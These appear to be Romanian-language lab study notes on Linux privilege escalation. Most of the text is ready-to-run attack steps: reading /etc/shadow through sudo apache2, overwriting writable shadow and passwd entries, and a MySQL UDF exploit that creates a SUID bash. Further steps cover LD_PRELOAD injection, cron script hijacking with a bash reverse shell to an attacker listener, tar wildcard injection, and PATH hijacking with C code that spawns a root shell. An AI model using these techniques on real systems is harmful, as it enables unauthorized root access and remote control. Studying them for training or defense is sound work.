# Linux Privilege Escalation (PrivEsc)

Privilege Escalation reprezintă exploatarea unei erori de configurare, vulnerabilități sau permisiuni neadecvate pentru a obține drepturi de administrator (`root` / `uid=0`) pornind de la un cont cu permisiuni reduse.

---

## 1. Recunoaștere Sudo & Arbitrary File Read

### Inspectarea privilegiilor curente
`sudo -l`
* Listează binarele pe care utilizatorul curent le poate rula cu drepturi de root (definite în `/etc/sudoers`).
* Referință rapidă pentru metode de evadare: https://gtfobins.github.io

### Citirea fișierelor arbitrare prin Apache2
Dacă utilizatorul poate executa `apache2` via `sudo`, parametrul `-f` (specificare fișier de configurare alternativ) forțează citirea fișierelor restricționate:
`sudo apache2 -f /etc/shadow`
* **Mecanism:** Apache deschide fișierul protejat ca root. Când întâlnește prima linie invalidă pentru sintaxa sa web, oprește execuția și afișează conținutul acelei linii în mesajul de eroare (`Syntax error ... Invalid command 'root:$6$...'`), dezvăluind hash-ul parolei pe ecran.

---

## 2. Weak File Permissions (/etc/shadow & /etc/passwd)

### Generare Hash Linux compatibil (SHA-512 crypt)
* Folosind OpenSSL: `openssl passwd -6 'ParolaAleasa'`
* Folosind mkpasswd: `mkpasswd -m sha-512 'ParolaAleasa'`

### Exploatare /etc/shadow modificabil (World-Writable)
Fișierul are o structură strictă de 9 câmpuri separate prin `:`:
`user:hash:lastchanged:min:max:warn:inactive:expire:reserved`

* **Pași:**
  1. Se generează hash-ul noii parole.
  2. Se editează fișierul și se înlocuiește **exclusiv câmpul 2** (între primul și al doilea `:`), păstrând toți ceilalți delimitatori:
     `root:$6$noul_hash...:18750:0:99999:7:::`
  3. Autentificare: `su root` folosind noua parolă.

### Exploatare /etc/passwd modificabil (World-Writable)
* În linia standard `root:x:0:0:root:/root:/bin/bash`, caracterul `x` instruiește sistemul să caute hash-ul parolei în `/etc/shadow`.
* **Bypass:** Înlocuirea directă a caracterului `x` cu un hash generat determină sistemul să verifice parola exclusiv din `/etc/passwd`, ignorând complet `/etc/shadow`:
  `root:$6$noul_hash...:0:0:root:/root:/bin/bash`
* **Notă de integritate:** Păstrează numele `root` intact; redenumirea contului împiedică utilitare precum `sudo` să funcționeze (`sudo: unknown user: root`).

---

## 3. Password Cracking (John the Ripper)

* **Concept:** Hashing-ul este o operație unidirecțională (one-way). John the Ripper nu decriptează hash-uri, ci realizează un atac pe bază de dicționar (*dictionary attack*): calculează hash-ul fiecărui cuvânt din listă și compară rezultatul cu hash-ul țintă până la potrivire.

### Pregătire Dicționar (Kali Linux)
`sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`

### Rulare Atac
* Executare dicționar pe fișierul cu hash-ul extras:
  `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
* Afișare credențiale identificate:
  `john --show hash.txt`

---

## 4. MySQL UDF (User-Defined Functions) Exploitation

Condiții preliminare: serviciul MySQL rulează ca `root` și permite autentificarea locală neparolată (`mysql -u root`).

### 1. Compilare Exploit (raptor_udf2.c)
* Compilare Position Independent Code (-fPIC):
  `gcc -g -c raptor_udf2.c -fPIC`
* Generare Shared Object (.so) cu SONAME definit:
  `gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

### 2. Încărcare bibliotecă în MySQL
* `use mysql;`
* `create table foo(line blob);`
* `insert into foo values(load_file('/tmp/raptor_udf2.so'));`
* `select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
* `create function do_system returns integer soname 'raptor_udf2.so';`

### 3. Creare Shell SUID & Escaladare
* În consola MySQL:
  `select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
  `exit;`
* În terminalul bash:
  `/tmp/rootbash -p`
* Curățare artefacte:
  `rm /tmp/rootbash`
  `exit`

---

## 5. Sudo Environment Variables (LD_PRELOAD)

### Mecanism & Vulnerabilitate
La rularea `sudo -l`, dacă în secțiunea `env_keep` apare definit:
Defaults    env_keep += LD_PRELOAD

Înseamnă că `sudo` nu curăță variabila de mediu `LD_PRELOAD` la tranziția către administrator. Linker-ul dinamic (`ld.so`) este forțat să încarce biblioteca specificată înaintea oricărei alte biblioteci a programului țintă. Deoarece programul rulează prin `sudo`, codul din biblioteca injectată este executat direct cu privilegii de `root` (`uid=0`).

### Pași de exploatare

1. Compilare fișier Shared Object (.so):
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
* -fPIC: Position Independent Code (necesar pentru biblioteci partajate).
* -shared: Generează fișierul .so.
* -nostartfiles: Omite funcția standard de start (main).

2. Execuție via sudo cu injectare de bibliotecă:
Se poate folosi orice program permis în sudo -l (ex: apache2):
sudo LD_PRELOAD=/tmp/preload.so apache2

3. Verificare privilegii:
id
* Output așteptat: uid=0(root) gid=0(root) groups=0(root)



---

## 6. Cron Jobs PrivEsc & Netcat Listener

### Mecanism & Vulnerabilitate
Task-urile din cron rulează strict cu permisiunile utilizatorului care le deține (al 6-lea câmp din crontab). Dacă un cronjob este deținut de `root`, dar scriptul executat are permisiuni de scriere pentru utilizatori obișnuiți (*world-writable*) sau dacă variabila `PATH` este configurată nesigur, un atacator poate obține execuție de comenzi cu drepturi depline de `root`.

### Inspectare Cron Jobs
cat /etc/crontab
ls -la /etc/cron.*

Structura unei linii din /etc/crontab:
* * * * * root /usr/local/bin/backup.sh
(Minut | Oră | Zi din lună | Lună | Zi din săptămână | Utilizator | Comandă/Script)

### Listener Netcat (nc -nvlp)
Utilitar folosit pe mașina de atac pentru a aștepta o conexiune de intrare (Reverse Shell):
nc -nvlp 4444

Semnificația flag-urilor:
* -n: Numeric-only. Dezactivează rezoluția DNS pentru viteză și stabilitate.
* -v: Verbose. Afișează mesaje despre starea conexiunii (ex: "Connection received...").
* -l: Listen. Pornește modul server/ascultare pentru conexiuni noi.
* -p: Port. Definește numărul portului pe care ascultă listener-ul.

### Metoda 1: Exploatare Script Writable (Permisiuni Slabe)
1. Injectează un payload care creează o copie de bash cu bit SUID:
echo "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash" >> /usr/local/bin/backup.sh

2. Sau injectează un Reverse Shell către listener-ul de pe mașina ta de atac:
echo "bash -i >& /dev/tcp/10.x.x.x/4444 0>&1" >> /usr/local/bin/backup.sh

3. După ce minutul s-a scurs și cron-ul a rulat comanda:
/tmp/rootbash -p
id
* Output așteptat: uid=0(root) gid=0(root) groups=0(root)

### Metoda 2: Cron PATH Hijacking
Apare când în `/etc/crontab` variabila `PATH` începe cu un director la care utilizatorul are acces de scriere (ex: `PATH=/home/user:...`), iar comanda apelată este relativă (ex: `overwrite.sh` în loc de calea completă `/usr/local/bin/overwrite.sh`).

1. Creează scriptul malițios direct în folderul prioritar (/home/user):
cat << 'EOF' > /home/user/overwrite.sh
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF

2. Fă fișierul executabil:
chmod +x /home/user/overwrite.sh

3. Așteaptă rularea cron-ului (sub 1 minut) și rulează binarul cu SUID:
/tmp/rootbash -p
* chmod +xs: Fiind rulat de root, binarul /tmp/rootbash va aparține lui root și va avea SUID setat.
* -p: Privileged mode (împiedică bash să renunțe la privilegiile de root).

4. Curățare artefacte:
rm /tmp/rootbash
exit

---

### Metoda 3: Tar Wildcard Injection

#### Mecanism & Vulnerabilitate
Apare atunci când un cronjob deținut de `root` execută o arhivare folosind caracterul generic `*` (ex: `tar czf /tmp/backup.tar.gz *`):
1. **Shell Globbing:** Înainte de apelul utilitarului `tar`, interpretorul Bash expandează caracterul `*` în lista completă a numelor de fișiere din directorul curent.
2. **Argument Injection:** Numele de fișiere create special care încep cu `--` sunt interpretate de `tar` ca opțiuni de configurare (flags), nu ca fișiere destinate arhivării.

#### Exploatare (Checkpoint Flags)
Utilitarul `tar` include funcționalități de checkpointing ce permit execuția de comenzi:
* `--checkpoint=1`: Declanșează o acțiune la fiecare înregistrare procesată.
* `--checkpoint-action=exec=<payload>`: Execută instrucțiunea specificată cu drepturile procesului părinte (`root`).

#### Pași de reproducere
1. Pregătirea payload-ului pe mașina țintă (exemplu: shell inversat sau binar privilegiat):
   ```bash
   chmod +x /home/user/shell.elf
   ```
2. Crearea fișierelor ce vor acționa ca argumente injectate în comanda `tar`:
   ```bash
   touch /home/user/--checkpoint=1
   touch /home/user/--checkpoint-action=exec=shell.elf

---

## Concept: Reverse Shell

### Definiție & Arhitectură
Un **Reverse Shell** este o tehnică prin care o mașină țintă inițiază o conexiune de rețea outbound (ieșire) către un listener controlat de administrator/atacator, atașând un interpretor de comenzi (`/bin/sh` sau `/bin/bash`) la acel canal de comunicație.

* **Bind Shell (Tradițional):** Ținta deschide un port local și așteaptă conexiuni inbound. Deseori blocat de firewall-uri perimetrice și politici de filtrare a traficului de intrare.
* **Reverse Shell (Inversat):** Ținta acționează drept client și se conectează în exterior. Ocolește politicile standard de ingress firewall și restricțiile impuse de NAT, traficul de ieșire fiind frecvent permis.

---

### Mecanism Intern (Linux I/O & Syscalls)
În arhitectura Unix, „totul este un fișier”, iar fiecare proces utilizează trei descriptori standard de intrare/ieșire:
* `0` — `stdin` (tastatură / intrare)
* `1` — `stdout` (ecran / ieșire normală)
* `2` — `stderr` (ecran / ieșire de eroare)

La nivelul nucleului Linux, un payload de reverse shell execută următorul flux:
1. **`socket()` & `connect()`:** Creează un socket TCP și se conectează la IP-ul și portul listener-ului (obținând un descriptor, de ex. `fd 3`).
2. **`dup2()`:** Duplică descriptorul de socket peste canalele standard (`dup2(fd, 0)`, `dup2(fd, 1)`, `dup2(fd, 2)`). În acest mod, intrarea și ieșirile procesului sunt legate direct la conexiunea de rețea.
3. **`execve()`:** Instanțiază interpretorul de comenzi (`/bin/sh`), care moștenește descriptorii redirecționați. Orice comandă trimisă prin rețea este executată de shell, iar output-ul este transmis înapoi prin socket.

---

### Relația cu Privilege Escalation
În procesul de escaladare a privilegiilor (ex: exploatarea unui Cron Job executat de `root`):
* Dacă binarul de reverse shell este lansat de un proces privilegiat (`UID 0`), procesul fiu (`/bin/sh`) moștenește contextul de securitate al părintelui.
* Listener-ul extern primește astfel o sesiune interactivă direct cu drepturi depline de administrator (`root`).

---


## 7. SUID / SGID Executables

### Concepte Cheie
* **SUID (Set User ID):** Bit de permisiune (`u+s`) care face ca un binar executabil să ruleze cu privilegiile **proprietarului fișierului** (frecvent `root`), nu cu cele ale utilizatorului care îl invocă.
* **SGID (Set Group ID):** Bit de permisiune (`g+s`) similar, care moștenește drepturile **grupului** deținător.
* **Suprafață de Atac:** Dacă un binar SUID deținut de `root` conține o vulnerabilitate (de tip buffer overflow, command injection sau logică de configurare nesigură), un utilizator local poate obține execuție de cod arbitrar direct cu privilegii depline.

---

### Enumerare SUID/SGID pe Sistem

Pentru a identifica toate executabilele care rulează cu permisiuni ridicate:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

---


## 8. SUID Shared Object Injection

### Mecanism & Vulnerabilitate
La pornirea unui binar compilat cu legare dinamică (*dynamic linking*), sistemul apelează încărcătorul dinamic (*dynamic linker/loader*) pentru a identifica și mapa în memorie fișierele de tip Shared Object (`.so`). 

Vulnerabilitatea apare dacă un executabil cu bitul **SUID** (`root`) îndeplinește simultan două condiții:
1. Caută o bibliotecă partajată (`.so`) într-un director controlabil de un utilizator neprivilegiat (de exemplu, o cale relativă sau o locație din `/home/user` definită prin `RPATH`/`RUNPATH`).
2. Biblioteca respectivă lipsește de pe disc, permițând crearea unui fișier arbitrar cu același nume în directorul vizat.

Când binarul este relansat, biblioteca malițioasă este încărcată direct în spațiul de adrese al procesului și rulează sub contextul de securitate al deținătorului binarului (`root`).

---

### Detectare și Enumerare cu `strace`

Pentru a intercepta apelurile de sistem de deschidere și verificare a fișierelor:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Pentru detalii avansate, citește despre [Utilizarea Strace](/notes/linux/troubleshooting.md#1-monitorizarea-apelurilor-de-sistem-cu-strace).

---


## 9. SUID Executable via PATH Environment Variable

### Mecanism & Vulnerabilitate
Această vulnerabilitate apare atunci când un binar SUID execută o comandă de sistem sau un alt program extern fără a specifica calea absolută către acesta (de exemplu, apelează doar `service apache2 start` în loc de `/usr/sbin/service apache2 start`). 

Deoarece binarul moștenește variabila de mediu `PATH` a utilizatorului curent, sistemul va căuta executabilul în directoarele specificate în `PATH`, de la stânga la dreapta. Un atacator poate manipula această variabilă pentru a forța binarul SUID să ruleze un executabil malițios în locul celui legitim.

### Analiza Binarului și Detectare
1. **Identificarea comportamentului binarului:**
   Rulează executabilul și observă ce alte servicii sau utilitare pare că încearcă să pornească:
   ```bash
   /usr/local/bin/suid-env
   ```

2. **Inspectarea șirurilor de caractere (Strings):**
   Caută comenzi sau apeluri text nesecurizate în interiorul fișierului binar:
   ```bash
   strings /usr/local/bin/suid-env
   ```
   *Dacă observi o linie precum `service apache2 start`, înseamnă că binarul apelează un executabil fără calea sa absolută.*

### Etape de Exploatare (PoC)
Pentru a deturna fluxul de execuție și a obține un shell de `root`:

1. **Crearea falsului executabil:**
   Scrie un cod simplu în C (la `/home/user/tools/suid/service.c`) care spawnează un shell Bash:
   ```c
   int main() {
       setuid(0);
       setgid(0);
       system("/bin/bash");
       return 0;
   }
   ```

2. **Compilarea codului:**
   Compilează fișierul sub numele executabilului apelat de binarul SUID (în acest caz, `service`):
   ```bash
   gcc -o service /home/user/tools/suid/service.c
   ```

3. **Deturnarea variabilei PATH:**
   Adaugă directorul curent (unde se află noul tău executabil `service`) la începutul variabilei `PATH` și rulează binarul SUID:
   ```bash
   PATH=.:\$PATH /usr/local/bin/suid-env
   ```

> ⚠️ **Notă:** Nu uita să folosești comanda `exit` pentru a ieși din shell-ul de root după ce ai finalizat testarea!
